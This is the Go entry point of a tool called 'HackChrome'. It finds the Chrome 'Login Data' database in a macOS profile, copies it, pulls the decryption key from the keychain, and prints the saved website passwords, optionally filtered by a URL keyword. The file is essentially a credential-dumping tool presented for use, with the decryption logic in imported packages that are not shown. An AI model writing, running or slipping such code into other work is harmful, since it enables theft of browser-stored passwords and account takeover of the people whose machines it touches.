package main

import (
	"HackChrome/core"
	"HackChrome/model"
	"HackChrome/utils"
	"flag"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"os/user"
)

var keyword string
var profile string

func init() {
	flag.StringVar(&keyword, "k", "", "keywords for website url")
	flag.StringVar(&profile, "p", getUserDefaultProfile(), "profile path for  Google Chrome, you can check with chrome://version ")
}

func getUserDefaultProfile() string {
	user, _ := user.Current()
	return fmt.Sprintf("%s/Library/ApplicationSupport/Google/Chrome/Default", user.HomeDir)
}

func checkError(err error) bool {
	if nil != err {
		fmt.Println(err)
		return true
	}
	return false
}

func main() {

	flag.Parse()

	dbFile := ""

	if profile != "" {
		dbFile = fmt.Sprintf("%s/Login Data", profile)
	} else {
		dbFile = fmt.Sprintf("%s/Login Data", getUserDefaultProfile())
	}

	if !utils.FileExists(dbFile) {
		fmt.Printf("file %s doesn't exists, please check it!\n", dbFile)
		return
	}

	// When google chrome is running, we can't read sqlite file, so we make a copy of it
	file, err := utils.BuildTempFile(dbFile)

	if err != nil {
		fmt.Println(err)
		return
	}

	// get key from MacOX keychain
	key, err := utils.GetDerivedKey()

	if checkError(err) {
		return
	}

	queryModel := model.LoginInfoQuery{
		KeyWord: keyword,
		Key:     key,
	}

	result, err := core.QueryPasswordInfo(file.Name(), &queryModel)

	if checkError(err) {
		return
	}

	utils.RemoveFile(file)
	utils.FormatOutput(result)
}
